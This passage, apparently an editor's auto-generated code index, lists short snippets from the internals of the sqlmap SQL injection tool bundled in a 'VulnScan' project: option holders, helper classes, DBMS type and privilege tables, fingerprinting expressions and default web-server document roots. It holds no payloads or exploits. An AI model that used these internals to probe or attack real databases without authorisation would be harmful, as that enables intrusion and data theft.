        "peekOfCode": "cmdLineOptions = AttribDict()\n# object to store merged options (command line, configuration file and default options)\nmergedOptions = AttribDict()\n# object to share within function and classes command\n# line options and settings\nconf = AttribDict()\n# object to share within function and classes results\nkb = AttribDict()\n# object with each database management system specific queries\nqueries = {}",
        "detail": "VulnScan.modules.sqlmap.lib.core.data",
        "documentation": {}
    },
    {
        "label": "mergedOptions",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.data",
        "description": "VulnScan.modules.sqlmap.lib.core.data",
        "peekOfCode": "mergedOptions = AttribDict()\n# object to share within function and classes command\n# line options and settings\nconf = AttribDict()\n# object to share within function and classes results\nkb = AttribDict()\n# object with each database management system specific queries\nqueries = {}\n# logger\nlogger = LOGGER",
        "detail": "VulnScan.modules.sqlmap.lib.core.data",
        "documentation": {}
    },
    {
        "label": "conf",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.data",
        "description": "VulnScan.modules.sqlmap.lib.core.data",
        "peekOfCode": "conf = AttribDict()\n# object to share within function and classes results\nkb = AttribDict()\n# object with each database management system specific queries\nqueries = {}\n# logger\nlogger = LOGGER",
        "detail": "VulnScan.modules.sqlmap.lib.core.data",
        "documentation": {}
    },
    {
        "label": "kb",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.data",
        "description": "VulnScan.modules.sqlmap.lib.core.data",
        "peekOfCode": "kb = AttribDict()\n# object with each database management system specific queries\nqueries = {}\n# logger\nlogger = LOGGER",
        "detail": "VulnScan.modules.sqlmap.lib.core.data",
        "documentation": {}
    },
    {
        "label": "queries",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.data",
        "description": "VulnScan.modules.sqlmap.lib.core.data",
        "peekOfCode": "queries = {}\n# logger\nlogger = LOGGER",
        "detail": "VulnScan.modules.sqlmap.lib.core.data",
        "documentation": {}
    },
    {
        "label": "logger",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.data",
        "description": "VulnScan.modules.sqlmap.lib.core.data",
        "peekOfCode": "logger = LOGGER",
        "detail": "VulnScan.modules.sqlmap.lib.core.data",
        "documentation": {}
    },
    {
        "label": "AttribDict",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.datatype",
        "description": "VulnScan.modules.sqlmap.lib.core.datatype",
        "peekOfCode": "class AttribDict(dict):\n    \"\"\"\n    This class defines the dictionary with added capability to access members as attributes\n    >>> foo = AttribDict()\n    >>> foo.bar = 1\n    >>> foo.bar\n    1\n    \"\"\"\n    def __init__(self, indict=None, attribute=None, keycheck=True):\n        if indict is None:",
        "detail": "VulnScan.modules.sqlmap.lib.core.datatype",
        "documentation": {}
    },
    {
        "label": "InjectionDict",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.datatype",
        "description": "VulnScan.modules.sqlmap.lib.core.datatype",
        "peekOfCode": "class InjectionDict(AttribDict):\n    def __init__(self):\n        AttribDict.__init__(self)\n        self.place = None\n        self.parameter = None\n        self.ptype = None\n        self.prefix = None\n        self.suffix = None\n        self.clause = None\n        self.notes = []  # Note: https://github.com/sqlmapproject/sqlmap/issues/1888",
        "detail": "VulnScan.modules.sqlmap.lib.core.datatype",
        "documentation": {}
    },
    {
        "label": "LRUDict",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.datatype",
        "description": "VulnScan.modules.sqlmap.lib.core.datatype",
        "peekOfCode": "class LRUDict(object):\n    \"\"\"\n    This class defines the LRU dictionary\n    >>> foo = LRUDict(capacity=2)\n    >>> foo[\"first\"] = 1\n    >>> foo[\"second\"] = 2\n    >>> foo[\"third\"] = 3\n    >>> \"first\" in foo\n    False\n    >>> \"third\" in foo",
        "detail": "VulnScan.modules.sqlmap.lib.core.datatype",
        "documentation": {}
    },
    {
        "label": "OrderedSet",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.datatype",
        "description": "VulnScan.modules.sqlmap.lib.core.datatype",
        "peekOfCode": "class OrderedSet(_collections.MutableSet):\n    \"\"\"\n    This class defines the set with ordered (as added) items\n    >>> foo = OrderedSet()\n    >>> foo.add(1)\n    >>> foo.add(2)\n    >>> foo.add(3)\n    >>> foo.pop()\n    3\n    >>> foo.pop()",
        "detail": "VulnScan.modules.sqlmap.lib.core.datatype",
        "documentation": {}
    },
    {
        "label": "cachedmethod",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.decorators",
        "description": "VulnScan.modules.sqlmap.lib.core.decorators",
        "peekOfCode": "def cachedmethod(f):\n    \"\"\"\n    Method with a cached content\n    >>> __ = cachedmethod(lambda _: _)\n    >>> __(1)\n    1\n    >>> __(1)\n    1\n    >>> __ = cachedmethod(lambda *args, **kwargs: args[0])\n    >>> __(2)",
        "detail": "VulnScan.modules.sqlmap.lib.core.decorators",
        "documentation": {}
    },
    {
        "label": "stackedmethod",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.decorators",
        "description": "VulnScan.modules.sqlmap.lib.core.decorators",
        "peekOfCode": "def stackedmethod(f):\n    \"\"\"\n    Method using pushValue/popValue functions (fallback function for stack realignment)\n    >>> threadData = getCurrentThreadData()\n    >>> original = len(threadData.valueStack)\n    >>> __ = stackedmethod(lambda _: threadData.valueStack.append(_))\n    >>> __(1)\n    >>> len(threadData.valueStack) == original\n    True\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.decorators",
        "documentation": {}
    },
    {
        "label": "lockedmethod",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.decorators",
        "description": "VulnScan.modules.sqlmap.lib.core.decorators",
        "peekOfCode": "def lockedmethod(f):\n    @functools.wraps(f)\n    def _(*args, **kwargs):\n        if f not in _method_locks:\n            _method_locks[f] = threading.RLock()\n        with _method_locks[f]:\n            result = f(*args, **kwargs)\n        return result\n    return _",
        "detail": "VulnScan.modules.sqlmap.lib.core.decorators",
        "documentation": {}
    },
    {
        "label": "_cache",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.decorators",
        "description": "VulnScan.modules.sqlmap.lib.core.decorators",
        "peekOfCode": "_cache = {}\n_cache_lock = threading.Lock()\n_method_locks = {}\ndef cachedmethod(f):\n    \"\"\"\n    Method with a cached content\n    >>> __ = cachedmethod(lambda _: _)\n    >>> __(1)\n    1\n    >>> __(1)",
        "detail": "VulnScan.modules.sqlmap.lib.core.decorators",
        "documentation": {}
    },
    {
        "label": "_cache_lock",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.decorators",
        "description": "VulnScan.modules.sqlmap.lib.core.decorators",
        "peekOfCode": "_cache_lock = threading.Lock()\n_method_locks = {}\ndef cachedmethod(f):\n    \"\"\"\n    Method with a cached content\n    >>> __ = cachedmethod(lambda _: _)\n    >>> __(1)\n    1\n    >>> __(1)\n    1",
        "detail": "VulnScan.modules.sqlmap.lib.core.decorators",
        "documentation": {}
    },
    {
        "label": "_method_locks",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.decorators",
        "description": "VulnScan.modules.sqlmap.lib.core.decorators",
        "peekOfCode": "_method_locks = {}\ndef cachedmethod(f):\n    \"\"\"\n    Method with a cached content\n    >>> __ = cachedmethod(lambda _: _)\n    >>> __(1)\n    1\n    >>> __(1)\n    1\n    >>> __ = cachedmethod(lambda *args, **kwargs: args[0])",
        "detail": "VulnScan.modules.sqlmap.lib.core.decorators",
        "documentation": {}
    },
    {
        "label": "_defaults",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.defaults",
        "description": "VulnScan.modules.sqlmap.lib.core.defaults",
        "peekOfCode": "_defaults = {\n    \"csvDel\": ',',\n    \"timeSec\": 5,\n    \"googlePage\": 1,\n    \"verbose\": 1,\n    \"delay\": 0,\n    \"timeout\": 30,\n    \"retries\": 3,\n    \"csrfRetries\": 0,\n    \"safeFreq\": 0,",
        "detail": "VulnScan.modules.sqlmap.lib.core.defaults",
        "documentation": {}
    },
    {
        "label": "defaults",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.defaults",
        "description": "VulnScan.modules.sqlmap.lib.core.defaults",
        "peekOfCode": "defaults = AttribDict(_defaults)",
        "detail": "VulnScan.modules.sqlmap.lib.core.defaults",
        "documentation": {}
    },
    {
        "label": "FIREBIRD_TYPES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.dicts",
        "description": "VulnScan.modules.sqlmap.lib.core.dicts",
        "peekOfCode": "FIREBIRD_TYPES = {\n    261: \"BLOB\",\n    14: \"CHAR\",\n    40: \"CSTRING\",\n    11: \"D_FLOAT\",\n    27: \"DOUBLE\",\n    10: \"FLOAT\",\n    16: \"INT64\",\n    8: \"INTEGER\",\n    9: \"QUAD\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "INFORMIX_TYPES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.dicts",
        "description": "VulnScan.modules.sqlmap.lib.core.dicts",
        "peekOfCode": "INFORMIX_TYPES = {\n    0: \"CHAR\",\n    1: \"SMALLINT\",\n    2: \"INTEGER\",\n    3: \"FLOAT\",\n    4: \"SMALLFLOAT\",\n    5: \"DECIMAL\",\n    6: \"SERIAL\",\n    7: \"DATE\",\n    8: \"MONEY\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "SYBASE_TYPES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.dicts",
        "description": "VulnScan.modules.sqlmap.lib.core.dicts",
        "peekOfCode": "SYBASE_TYPES = {\n    14: \"floatn\",\n    8: \"float\",\n    15: \"datetimn\",\n    12: \"datetime\",\n    23: \"real\",\n    28: \"numericn\",\n    10: \"numeric\",\n    27: \"decimaln\",\n    26: \"decimal\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "ALTIBASE_TYPES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.dicts",
        "description": "VulnScan.modules.sqlmap.lib.core.dicts",
        "peekOfCode": "ALTIBASE_TYPES = {\n    1: \"CHAR\",\n    12: \"VARCHAR\",\n    -8: \"NCHAR\",\n    -9: \"NVARCHAR\",\n    2: \"NUMERIC\",\n    6: \"FLOAT\",\n    8: \"DOUBLE\",\n    7: \"REAL\",\n    -5: \"BIGINT\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "MYSQL_PRIVS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.dicts",
        "description": "VulnScan.modules.sqlmap.lib.core.dicts",
        "peekOfCode": "MYSQL_PRIVS = {\n    1: \"select_priv\",\n    2: \"insert_priv\",\n    3: \"update_priv\",\n    4: \"delete_priv\",\n    5: \"create_priv\",\n    6: \"drop_priv\",\n    7: \"reload_priv\",\n    8: \"shutdown_priv\",\n    9: \"process_priv\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "PGSQL_PRIVS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.dicts",
        "description": "VulnScan.modules.sqlmap.lib.core.dicts",
        "peekOfCode": "PGSQL_PRIVS = {\n    1: \"createdb\",\n    2: \"super\",\n    3: \"catupd\",\n}\n# Reference(s): http://stackoverflow.com/a/17672504\n#               http://docwiki.embarcadero.com/InterBase/XE7/en/RDB$USER_PRIVILEGES\nFIREBIRD_PRIVS = {\n    \"S\": \"SELECT\",\n    \"I\": \"INSERT\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "FIREBIRD_PRIVS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.dicts",
        "description": "VulnScan.modules.sqlmap.lib.core.dicts",
        "peekOfCode": "FIREBIRD_PRIVS = {\n    \"S\": \"SELECT\",\n    \"I\": \"INSERT\",\n    \"U\": \"UPDATE\",\n    \"D\": \"DELETE\",\n    \"R\": \"REFERENCE\",\n    \"X\": \"EXECUTE\",\n    \"A\": \"ALL\",\n    \"M\": \"MEMBER\",\n    \"T\": \"DECRYPT\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "INFORMIX_PRIVS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.dicts",
        "description": "VulnScan.modules.sqlmap.lib.core.dicts",
        "peekOfCode": "INFORMIX_PRIVS = {\n    \"D\": \"DBA (all privileges)\",\n    \"R\": \"RESOURCE (create UDRs, UDTs, permanent tables and indexes)\",\n    \"C\": \"CONNECT (work with existing tables)\",\n    \"G\": \"ROLE\",\n    \"U\": \"DEFAULT (implicit connection)\",\n}\nDB2_PRIVS = {\n    1: \"CONTROLAUTH\",\n    2: \"ALTERAUTH\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "DB2_PRIVS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.dicts",
        "description": "VulnScan.modules.sqlmap.lib.core.dicts",
        "peekOfCode": "DB2_PRIVS = {\n    1: \"CONTROLAUTH\",\n    2: \"ALTERAUTH\",\n    3: \"DELETEAUTH\",\n    4: \"INDEXAUTH\",\n    5: \"INSERTAUTH\",\n    6: \"REFAUTH\",\n    7: \"SELECTAUTH\",\n    8: \"UPDATEAUTH\",\n}",
        "detail": "VulnScan.modules.sqlmap.lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "DUMP_REPLACEMENTS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.dicts",
        "description": "VulnScan.modules.sqlmap.lib.core.dicts",
        "peekOfCode": "DUMP_REPLACEMENTS = {\" \": NULL, \"\": BLANK}\nDBMS_DICT = {\n    DBMS.MSSQL: (MSSQL_ALIASES, \"python-pymssql\", \"https://github.com/pymssql/pymssql\", \"mssql+pymssql\"),\n    DBMS.MYSQL: (MYSQL_ALIASES, \"python-pymysql\", \"https://github.com/PyMySQL/PyMySQL\", \"mysql\"),\n    DBMS.PGSQL: (PGSQL_ALIASES, \"python-psycopg2\", \"https://github.com/psycopg/psycopg2\", \"postgresql\"),\n    DBMS.ORACLE: (ORACLE_ALIASES, \"python cx_Oracle\", \"https://oracle.github.io/python-cx_Oracle/\", \"oracle\"),\n    DBMS.SQLITE: (SQLITE_ALIASES, \"python-sqlite\", \"https://docs.python.org/3/library/sqlite3.html\", \"sqlite\"),\n    DBMS.ACCESS: (ACCESS_ALIASES, \"python-pyodbc\", \"https://github.com/mkleehammer/pyodbc\", \"access\"),\n    DBMS.FIREBIRD: (FIREBIRD_ALIASES, \"python-kinterbasdb\", \"http://kinterbasdb.sourceforge.net/\", \"firebird\"),\n    DBMS.MAXDB: (MAXDB_ALIASES, None, None, \"maxdb\"),",
        "detail": "VulnScan.modules.sqlmap.lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "DBMS_DICT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.dicts",
        "description": "VulnScan.modules.sqlmap.lib.core.dicts",
        "peekOfCode": "DBMS_DICT = {\n    DBMS.MSSQL: (MSSQL_ALIASES, \"python-pymssql\", \"https://github.com/pymssql/pymssql\", \"mssql+pymssql\"),\n    DBMS.MYSQL: (MYSQL_ALIASES, \"python-pymysql\", \"https://github.com/PyMySQL/PyMySQL\", \"mysql\"),\n    DBMS.PGSQL: (PGSQL_ALIASES, \"python-psycopg2\", \"https://github.com/psycopg/psycopg2\", \"postgresql\"),\n    DBMS.ORACLE: (ORACLE_ALIASES, \"python cx_Oracle\", \"https://oracle.github.io/python-cx_Oracle/\", \"oracle\"),\n    DBMS.SQLITE: (SQLITE_ALIASES, \"python-sqlite\", \"https://docs.python.org/3/library/sqlite3.html\", \"sqlite\"),\n    DBMS.ACCESS: (ACCESS_ALIASES, \"python-pyodbc\", \"https://github.com/mkleehammer/pyodbc\", \"access\"),\n    DBMS.FIREBIRD: (FIREBIRD_ALIASES, \"python-kinterbasdb\", \"http://kinterbasdb.sourceforge.net/\", \"firebird\"),\n    DBMS.MAXDB: (MAXDB_ALIASES, None, None, \"maxdb\"),\n    DBMS.SYBASE: (SYBASE_ALIASES, \"python-pymssql\", \"https://github.com/pymssql/pymssql\", \"sybase\"),",
        "detail": "VulnScan.modules.sqlmap.lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "FROM_DUMMY_TABLE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.dicts",
        "description": "VulnScan.modules.sqlmap.lib.core.dicts",
        "peekOfCode": "FROM_DUMMY_TABLE = {\n    DBMS.ORACLE: \" FROM DUAL\",\n    DBMS.ACCESS: \" FROM MSysAccessObjects\",\n    DBMS.FIREBIRD: \" FROM RDB$DATABASE\",\n    DBMS.MAXDB: \" FROM VERSIONS\",\n    DBMS.DB2: \" FROM SYSIBM.SYSDUMMY1\",\n    DBMS.HSQLDB: \" FROM INFORMATION_SCHEMA.SYSTEM_USERS\",\n    DBMS.INFORMIX: \" FROM SYSMASTER:SYSDUAL\",\n    DBMS.DERBY: \" FROM SYSIBM.SYSDUMMY1\",\n    DBMS.MIMERSQL: \" FROM SYSTEM.ONEROW\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "HEURISTIC_NULL_EVAL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.dicts",
        "description": "VulnScan.modules.sqlmap.lib.core.dicts",
        "peekOfCode": "HEURISTIC_NULL_EVAL = {\n    DBMS.ACCESS: \"CVAR(NULL)\",\n    DBMS.MAXDB: \"ALPHA(NULL)\",\n    DBMS.MSSQL: \"DIFFERENCE(NULL,NULL)\",\n    DBMS.MYSQL: \"QUARTER(NULL)\",\n    DBMS.ORACLE: \"INSTR2(NULL,NULL)\",\n    DBMS.PGSQL: \"QUOTE_IDENT(NULL)\",\n    DBMS.SQLITE: \"UNLIKELY(NULL)\",\n    DBMS.H2: \"STRINGTOUTF8(NULL)\",\n    DBMS.MONETDB: \"CODE(NULL)\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "SQL_STATEMENTS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.dicts",
        "description": "VulnScan.modules.sqlmap.lib.core.dicts",
        "peekOfCode": "SQL_STATEMENTS = {\n    \"SQL SELECT statement\": (\n        \"select \",\n        \"show \",\n        \" top \",\n        \" distinct \",\n        \" from \",\n        \" from dual\",\n        \" where \",\n        \" group by \",",
        "detail": "VulnScan.modules.sqlmap.lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "POST_HINT_CONTENT_TYPES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.dicts",
        "description": "VulnScan.modules.sqlmap.lib.core.dicts",
        "peekOfCode": "POST_HINT_CONTENT_TYPES = {\n    POST_HINT.JSON: \"application/json\",\n    POST_HINT.JSON_LIKE: \"application/json\",\n    POST_HINT.MULTIPART: \"multipart/form-data\",\n    POST_HINT.SOAP: \"application/soap+xml\",\n    POST_HINT.XML: \"application/xml\",\n    POST_HINT.ARRAY_LIKE: \"application/x-www-form-urlencoded; charset=utf-8\",\n}\nOBSOLETE_OPTIONS = {\n    \"--replicate\": \"use '--dump-format=SQLITE' instead\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "OBSOLETE_OPTIONS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.dicts",
        "description": "VulnScan.modules.sqlmap.lib.core.dicts",
        "peekOfCode": "OBSOLETE_OPTIONS = {\n    \"--replicate\": \"use '--dump-format=SQLITE' instead\",\n    \"--no-unescape\": \"use '--no-escape' instead\",\n    \"--binary\": \"use '--binary-fields' instead\",\n    \"--auth-private\": \"use '--auth-file' instead\",\n    \"--ignore-401\": \"use '--ignore-code' instead\",\n    \"--second-order\": \"use '--second-url' instead\",\n    \"--purge-output\": \"use '--purge' instead\",\n    \"--sqlmap-shell\": \"use '--shell' instead\",\n    \"--check-payload\": None,",
        "detail": "VulnScan.modules.sqlmap.lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "DEPRECATED_OPTIONS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.dicts",
        "description": "VulnScan.modules.sqlmap.lib.core.dicts",
        "peekOfCode": "DEPRECATED_OPTIONS = {\n}\nDUMP_DATA_PREPROCESS = {\n    DBMS.ORACLE: {\"XMLTYPE\": \"(%s).getStringVal()\"},  # Reference: https://www.tibcommunity.com/docs/DOC-3643\n    DBMS.MSSQL: {\"IMAGE\": \"CONVERT(VARBINARY(MAX),%s)\"},\n}\nDEFAULT_DOC_ROOTS = {\n    OS.WINDOWS: (\"C:/xampp/htdocs/\", \"C:/wamp/www/\", \"C:/Inetpub/wwwroot/\"),\n    OS.LINUX: (\"/var/www/\", \"/var/www/html\", \"/var/www/htdocs\", \"/usr/local/apache2/htdocs\", \"/usr/local/www/data\", \"/var/apache2/htdocs\", \"/var/www/nginx-default\", \"/srv/www/htdocs\", \"/usr/local/var/www\")  # Reference: https://wiki.apache.org/httpd/DistrosDefaultLayout\n}",
        "detail": "VulnScan.modules.sqlmap.lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "DUMP_DATA_PREPROCESS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.dicts",
        "description": "VulnScan.modules.sqlmap.lib.core.dicts",
        "peekOfCode": "DUMP_DATA_PREPROCESS = {\n    DBMS.ORACLE: {\"XMLTYPE\": \"(%s).getStringVal()\"},  # Reference: https://www.tibcommunity.com/docs/DOC-3643\n    DBMS.MSSQL: {\"IMAGE\": \"CONVERT(VARBINARY(MAX),%s)\"},\n}\nDEFAULT_DOC_ROOTS = {\n    OS.WINDOWS: (\"C:/xampp/htdocs/\", \"C:/wamp/www/\", \"C:/Inetpub/wwwroot/\"),\n    OS.LINUX: (\"/var/www/\", \"/var/www/html\", \"/var/www/htdocs\", \"/usr/local/apache2/htdocs\", \"/usr/local/www/data\", \"/var/apache2/htdocs\", \"/var/www/nginx-default\", \"/srv/www/htdocs\", \"/usr/local/var/www\")  # Reference: https://wiki.apache.org/httpd/DistrosDefaultLayout\n}\nPART_RUN_CONTENT_TYPES = {\n    \"checkDbms\": CONTENT_TYPE.TECHNIQUES,",
        "detail": "VulnScan.modules.sqlmap.lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "DEFAULT_DOC_ROOTS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.dicts",
        "description": "VulnScan.modules.sqlmap.lib.core.dicts",
        "peekOfCode": "DEFAULT_DOC_ROOTS = {\n    OS.WINDOWS: (\"C:/xampp/htdocs/\", \"C:/wamp/www/\", \"C:/Inetpub/wwwroot/\"),\n    OS.LINUX: (\"/var/www/\", \"/var/www/html\", \"/var/www/htdocs\", \"/usr/local/apache2/htdocs\", \"/usr/local/www/data\", \"/var/apache2/htdocs\", \"/var/www/nginx-default\", \"/srv/www/htdocs\", \"/usr/local/var/www\")  # Reference: https://wiki.apache.org/httpd/DistrosDefaultLayout\n}\nPART_RUN_CONTENT_TYPES = {\n    \"checkDbms\": CONTENT_TYPE.TECHNIQUES,\n    \"getFingerprint\": CONTENT_TYPE.DBMS_FINGERPRINT,\n    \"getBanner\": CONTENT_TYPE.BANNER,\n    \"getCurrentUser\": CONTENT_TYPE.CURRENT_USER,\n    \"getCurrentDb\": CONTENT_TYPE.CURRENT_DB,",
        "detail": "VulnScan.modules.sqlmap.lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "PART_RUN_CONTENT_TYPES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.dicts",
        "description": "VulnScan.modules.sqlmap.lib.core.dicts",
        "peekOfCode": "PART_RUN_CONTENT_TYPES = {\n    \"checkDbms\": CONTENT_TYPE.TECHNIQUES,\n    \"getFingerprint\": CONTENT_TYPE.DBMS_FINGERPRINT,\n    \"getBanner\": CONTENT_TYPE.BANNER,\n    \"getCurrentUser\": CONTENT_TYPE.CURRENT_USER,\n    \"getCurrentDb\": CONTENT_TYPE.CURRENT_DB,\n    \"getHostname\": CONTENT_TYPE.HOSTNAME,\n    \"isDba\": CONTENT_TYPE.IS_DBA,\n    \"getUsers\": CONTENT_TYPE.USERS,\n    \"getPasswordHashes\": CONTENT_TYPE.PASSWORDS,",
        "detail": "VulnScan.modules.sqlmap.lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "HTML_ENTITIES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.dicts",
        "description": "VulnScan.modules.sqlmap.lib.core.dicts",
        "peekOfCode": "HTML_ENTITIES = {\n    \"quot\": 34,\n    \"amp\": 38,\n    \"apos\": 39,\n    \"lt\": 60,\n    \"gt\": 62,\n    \"nbsp\": 160,\n    \"iexcl\": 161,\n    \"cent\": 162,\n    \"pound\": 163,",
        "detail": "VulnScan.modules.sqlmap.lib.core.dicts",
        "documentation": {}
    },
    {
        "label": "Dump",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.dump",
        "description": "VulnScan.modules.sqlmap.lib.core.dump",
        "peekOfCode": "class Dump(object):\n    \"\"\"\n    This class defines methods used to parse and output the results\n    of SQL injection actions\n    \"\"\"\n    def __init__(self):\n        self._outputFile = None\n        self._outputFP = None\n        self._lock = threading.Lock()\n    def _write(self, data, newline=True, console=True, content_type=None):",
        "detail": "VulnScan.modules.sqlmap.lib.core.dump",
        "documentation": {}
    },
    {
        "label": "dumper",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.dump",
        "description": "VulnScan.modules.sqlmap.lib.core.dump",
        "peekOfCode": "dumper = Dump()",
        "detail": "VulnScan.modules.sqlmap.lib.core.dump",
        "documentation": {}
    },
    {
        "label": "PRIORITY",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class PRIORITY(object):\n    LOWEST = -100\n    LOWER = -50\n    LOW = -10\n    NORMAL = 0\n    HIGH = 10\n    HIGHER = 50\n    HIGHEST = 100\nclass SORT_ORDER(object):\n    FIRST = 0",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "SORT_ORDER",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class SORT_ORDER(object):\n    FIRST = 0\n    SECOND = 1\n    THIRD = 2\n    FOURTH = 3\n    FIFTH = 4\n    LAST = 100\n# Reference: https://docs.python.org/2/library/logging.html#logging-levels\nclass LOGGING_LEVELS(object):\n    NOTSET = 0",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "LOGGING_LEVELS",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class LOGGING_LEVELS(object):\n    NOTSET = 0\n    DEBUG = 10\n    INFO = 20\n    WARNING = 30\n    ERROR = 40\n    CRITICAL = 50\nclass DBMS(object):\n    ACCESS = \"Microsoft Access\"\n    DB2 = \"IBM DB2\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "DBMS",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class DBMS(object):\n    ACCESS = \"Microsoft Access\"\n    DB2 = \"IBM DB2\"\n    FIREBIRD = \"Firebird\"\n    MAXDB = \"SAP MaxDB\"\n    MSSQL = \"Microsoft SQL Server\"\n    MYSQL = \"MySQL\"\n    ORACLE = \"Oracle\"\n    PGSQL = \"PostgreSQL\"\n    SQLITE = \"SQLite\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "DBMS_DIRECTORY_NAME",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class DBMS_DIRECTORY_NAME(object):\n    ACCESS = \"access\"\n    DB2 = \"db2\"\n    FIREBIRD = \"firebird\"\n    MAXDB = \"maxdb\"\n    MSSQL = \"mssqlserver\"\n    MYSQL = \"mysql\"\n    ORACLE = \"oracle\"\n    PGSQL = \"postgresql\"\n    SQLITE = \"sqlite\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "FORK",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class FORK(object):\n    MARIADB = \"MariaDB\"\n    MEMSQL = \"MemSQL\"\n    PERCONA = \"Percona\"\n    COCKROACHDB = \"CockroachDB\"\n    TIDB = \"TiDB\"\n    REDSHIFT = \"Amazon Redshift\"\n    GREENPLUM = \"Greenplum\"\n    DRIZZLE = \"Drizzle\"\n    IGNITE = \"Apache Ignite\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "CUSTOM_LOGGING",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
